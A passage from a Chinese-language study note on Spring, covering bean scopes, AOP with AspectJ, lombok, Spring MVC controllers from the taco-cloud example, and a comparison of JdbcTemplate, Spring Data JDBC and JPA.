的一个实例</li><li><code>Prototype</code>，原型，每次注入或者通过 Spring 应用上下文获取的时候，都会创建一个新 bean 实例</li><li><code>Session</code>，会话，在 Web 应用中，为每个会话创建一个 bean 实例</li><li><code>Request</code>，请求，在 Web 应用中，为每个请求创建一个 bean 实例</li></ul><p>使用会话和请求作用域：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Scope(value=WebApplicationContext.SCOPE_SESSION, proxyMode=ScopedProxyMode.INTERFACES)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ShoppingCart <span class="title">cart</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面向切面编程"><a class="header-anchor" href="#面向切面编程">¶</a>面向切面编程</h2><blockquote><p>参见代码 <code>section3</code>。</p></blockquote><h3 id="AOP-术语"><a class="header-anchor" href="#AOP-术语">¶</a>AOP 术语</h3><ul><li>通知（Advice）：切面做什么以及何时做</li><li>切点（Pointcut）：何处</li><li>切面（Aspect）：Advice 和 Pointcut 的结合</li><li>连接点（Join point）：Spring 切面可以在方法前后连接，不可以在字段修改、构造方法上连接</li><li>引入（introduction）：引入新的行为和状态</li><li>织入（Weaving）：切面应用到目标对象的过程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span> <span class="comment">// 并不具有 @Component 的效果，不能在扫描时实例化，因此需要添加 @Component 注解或在 JacaConfig 类中主动实例化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Audience</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Before(&quot;execution(* concert.Performance.perform( .. ))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">silenceCellPhones</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Silencing cell phones&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;execution(* concert.Performance.perform( .. ))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeSeats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Taking seats&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterReturning(&quot;execution(* concert.Performance.perform( .. ))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">applause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CLAP CLAP CLAP!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterThrowing(&quot;execution(* concert.Performance.perform( .. ))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">demandRefund</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Demand a refund&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Audience1</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* concert.Performance.perform( .. ))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">performance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;performance()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">silenceCellPhones</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Silencing cell phones&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;performance()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeSeats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Taking seats&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterReturning(&quot;performance()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">applause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CLAP CLAP CLAP!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterThrowing(&quot;performance()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">demandRefund</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Demand a refund&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Audience2</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* concert.Performance.perform( .. )) &quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">performance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;performance()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">watchPerformance</span><span class="params">(ProceedingJoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;.Silencing cell phones&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;.Taking seats&quot;</span>);</span><br><span class="line">            joinPoint.proceed();</span><br><span class="line">            System.out.println(<span class="string">&quot;.CLAP CLAP CLAP!!!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;.Demanding a refund&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span> <span class="comment">// 开启 AspectJ 的自动代理机制</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConcertConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Performance <span class="title">concert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Concert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> EncoreableIntroducer <span class="title">encoreableIntroducer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> EncoreableIntroducer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Controller</code>、<code>@Service</code> 和 <code>@Repository</code> 三个注解本身有 <code>@Component</code> 的实例化效果。</p><h3 id="AspectJ-切点指示器（pointcut-designator）"><a class="header-anchor" href="#AspectJ-切点指示器（pointcut-designator）">¶</a>AspectJ 切点指示器（pointcut designator）</h3><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Pointcut(</span></span><br><span class="line"><span class="meta">    &quot;execution(* soundsystem.CompactDisc.playTrack( int )) &quot; +</span></span><br><span class="line"><span class="meta">        &quot;&amp;&amp; args(trackNumber)&quot;)</span> <span class="comment">// 获取参数</span></span><br><span class="line">        &amp;&amp; within(soundsystem.*) <span class="comment">// 限定包路径</span></span><br><span class="line">            &amp;&amp; bean(sgtPeppers) <span class="comment">// 限定 bean 名称，或者：&amp;&amp; !bean(sgtPeppers)</span></span><br></pre></td></tr></table></figure><p>另一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;@annotation(innerAuth)&quot;)</span> <span class="comment">// 限定注解 TODO</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">innerAround</span><span class="params">(ProceedingJoinPoint point, InnerAuth innerAuth)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@InnerAuth</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title">register</span><span class="params">(<span class="meta">@RequestBody</span> SysUser sysUser)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Web-开发框架"><a class="header-anchor" href="#Web-开发框架">¶</a>Web 开发框架</h2><h3 id="lombok"><a class="header-anchor" href="#lombok">¶</a>lombok</h3><blockquote><p>参考《Spring 实战（第 5 版）》2.1.1 节。</p></blockquote><p>依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>lombok 只在编译过程中起作用，编译期后就不需要了，要排除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;excludes&gt;</span><br><span class="line">            &lt;exclude&gt;</span><br><span class="line">                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br></pre></td></tr></table></figure><p>作用是简化代码书写，提供一些注解，帮助自动生成一些方法。</p><h3 id="Spring-MVC-的请求映射注解"><a class="header-anchor" href="#Spring-MVC-的请求映射注解">¶</a>Spring MVC 的请求映射注解</h3><blockquote><p>参考《Spring 实战（第 5 版）》表 2.1。</p></blockquote><table><thead><tr><th>注解</th><th>描述</th></tr></thead><tbody><tr><td><code>@RequestMapping</code></td><td>通用的请求处理，一般只在类级别使用</td></tr><tr><td><code>@GetMapping</code></td><td>处理 HTTP GET 请求</td></tr><tr><td><code>@PostMapping</code></td><td>处理 HTTP POST 请求</td></tr><tr><td><code>@PutMapping</code></td><td>处理 HTTP PUT 请求</td></tr><tr><td><code>@DeleteMapping</code></td><td>处理 HTTP DELETE 请求</td></tr><tr><td><code>@PatchMapping</code></td><td>处理 HTTP PATCH 请求</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/orders&quot;)</span></span><br><span class="line"><span class="meta">@SessionAttributes(&quot;tacoOrder&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/current&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">orderForm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;orderForm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">processOrder</span><span class="params">(<span class="meta">@Valid</span> TacoOrder order, Errors errors,</span></span></span><br><span class="line"><span class="params"><span class="function">                               SessionStatus sessionStatus)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (errors.hasErrors()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;orderForm&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;Order submitted: &#123;&#125;&quot;</span>, order);</span><br><span class="line">        sessionStatus.setComplete();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/design&quot;)</span></span><br><span class="line"><span class="meta">@SessionAttributes(&quot;tacoOrder&quot;)</span> <span class="comment">// 会话过程中，tacoOrder 不丢失</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DesignTacoController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ModelAttribute</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addIngredientsToModel</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">        List&lt;Ingredient&gt; ingredients = Arrays.asList(</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;FLTO&quot;</span>, <span class="string">&quot;Flour Tortilla&quot;</span>, Type.WRAP),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;COTO&quot;</span>, <span class="string">&quot;Corn Tortilla&quot;</span>, Type.WRAP),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;GRBF&quot;</span>, <span class="string">&quot;Ground Beef&quot;</span>, Type.PROTEIN),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;CARN&quot;</span>, <span class="string">&quot;Carnitas&quot;</span>, Type.PROTEIN),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;TMTO&quot;</span>, <span class="string">&quot;Diced Tomatoes&quot;</span>, Type.VEGGIES),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;LETC&quot;</span>, <span class="string">&quot;Lettuce&quot;</span>, Type.VEGGIES),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;CHED&quot;</span>, <span class="string">&quot;Cheddar&quot;</span>, Type.CHEESE),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;JACK&quot;</span>, <span class="string">&quot;Monterrey Jack&quot;</span>, Type.CHEESE),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;SLSA&quot;</span>, <span class="string">&quot;Salsa&quot;</span>, Type.SAUCE),</span><br><span class="line">                <span class="keyword">new</span> Ingredient(<span class="string">&quot;SRCR&quot;</span>, <span class="string">&quot;Sour Cream&quot;</span>, Type.SAUCE)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Type[] types = Ingredient.Type.values();</span><br><span class="line">        <span class="keyword">for</span> (Type type : types) &#123;</span><br><span class="line">            model.addAttribute(type.toString().toLowerCase(),</span><br><span class="line">                    filterByType(ingredients, type));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ModelAttribute(name = &quot;tacoOrder&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TacoOrder <span class="title">order</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TacoOrder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ModelAttribute(name = &quot;taco&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Taco <span class="title">taco</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Taco();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">showDesignForm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;design&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">processTaco</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@Valid</span> Taco taco, Errors errors,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="meta">@ModelAttribute</span> TacoOrder tacoOrder)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (errors.hasErrors()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;design&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tacoOrder.addTaco(taco);</span><br><span class="line">        log.info(<span class="string">&quot;Processing taco: &#123;&#125;&quot;</span>, taco);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/orders/current&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Iterable&lt;Ingredient&gt; <span class="title">filterByType</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">            List&lt;Ingredient&gt; ingredients, Type type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ingredients</span><br><span class="line">                .stream()</span><br><span class="line">                .filter(x -&gt; x.getType().equals(type))</span><br><span class="line">                .collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Spring-Web-开发框架的分层"><a class="header-anchor" href="#Spring-Web-开发框架的分层">¶</a>**Spring Web 开发框架的分层</h3><p>客户端请求参数分类：</p><ol><li>路径参数，<code>@PathVariable</code></li><li>请求参数（查询参数），<code>@RequestParam</code></li><li>表单参数，应用于前后端不分离的传统场景，默认，对应 model 对象，可以使用 <code>@Valid</code> 校验</li><li><code>json</code> 请求体，应用于前后端分离的场景，使用 <code>@RequestBody</code> 把 <code>json</code> 格式转成 java 对象；<code>@ResponseBody</code>，把 java 对象转成 <code>json</code> 格式</li></ol><p>前后端分离：客户端请求页面、json 格式数据，分别处理路径是什么？</p><p>前后端不分离：控制器层返回时渲染模板页面。</p><p>在类的上方加注解 <code>@RestController</code>。</p><blockquote><p>TODO：看第 13 次课，视频 1:36 处。</p></blockquote><h2 id="Spring-Data-JDBC、JPA"><a class="header-anchor" href="#Spring-Data-JDBC、JPA">¶</a>**Spring Data JDBC、JPA</h2><p>重点分析三个例子的区别。</p><table><thead><tr><th>特点</th><th>JdbcTemplate</th><th>Spring Data JDBC</th><th>JPA</th></tr></thead><tbody><tr><td>实现具体类</td><td>需要</td><td>不需要，只要写明继承关系</td><td>不需要，只要写明继承关系</td></tr><tr><td>定义实体类和数据库表的映射关系</td><td>不需要</td><td>需要</td><td>需要</td></tr><tr><td>程序员维护表之间的关系</td><td>需要</td><td>不需要</td><td>不需要</td></tr><tr><td>显式提供表结构（建表 SQL 脚本）</td><td>需要</td><td>需要</td><td>不需要，可以自动推断</td></tr></tbody></table><h3 id="使用-JdbcTemplate"><a class="header-anchor" href="#使用-JdbcTemplate">¶</a>使用 JdbcTemplate</h3><blockquote><p>参考代码 <code>taco-cloud-jdbctemplate</code></p></blockquote><p>特点：</p><ul><li>解决 <code>RawJdbcIngredientRepository</code> 样板式代码的问题，只需要提供查询逻辑；</li><li>需要实现具体类 <code>JdbcIngredientRepository</code> 而其他两种方法不用；</li><li>需要提供 <code>src/main/resources/schema.sql</code> 文件作为表结构的定义（建表脚本）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.h2database&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;h2&lt;/artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcIngredientRepository</span> <span class="keyword">implements</span> <span class="title">IngredientRepository</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JdbcIngredientRepository</span><span class="params">(JdbcTemplate jdbcTemplate)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.jdbcTemplate = jdbcTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterable&lt;Ingredient&gt; <span class="title">findAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(</span><br><span class="line">                <span class="string">&quot;select id, name, type from Ingredient&quot;</span>,</span><br><span class="line">                <span class="keyword">this</span>::mapRowToIngredient);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Spring-Data-JDBC"><a class="header-anchor" href="#使用-Spring-Data-JDBC">¶</a>使用 Spring Data JDBC</h3><blockquote><p>参考代码 <code>taco-cloud-jdbc</code></p></blockquote><p>特点：</p><ul><li>需要定义实体类和数据库表的映射关系；</li><li>不需要实现具体类，只需要写好继承关系；</li><li>需要提供 <code>src/main/resources/schema.sql</code> 文件作为表结构的定义（建表脚本）。</li></ul><p>CrudRepository&lt;T,T&gt; 中的 T 是类型参数，它表示实际类型将在使用时指定。CrudRepository 接口是 Spring Data JPA 提供的一个接口，它提供了一组基本的 CRUD 操作，包括计数，删除，deleteById，保存，saveAll，findById 和 findAll。CrudRepository 接口是 Repository 接口的子接口，它继承了 Repository 接口中的所有方法，并添加了一些基本的 CRUD 操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IngredientRepository</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">CrudRepository</span>&lt;<span class="title">Ingredient</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.annotation.Id;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.relational.core.mapping.Table;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Table</span> <span class="comment">// 可选，因为不需要借助类推断表结构</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor(access = 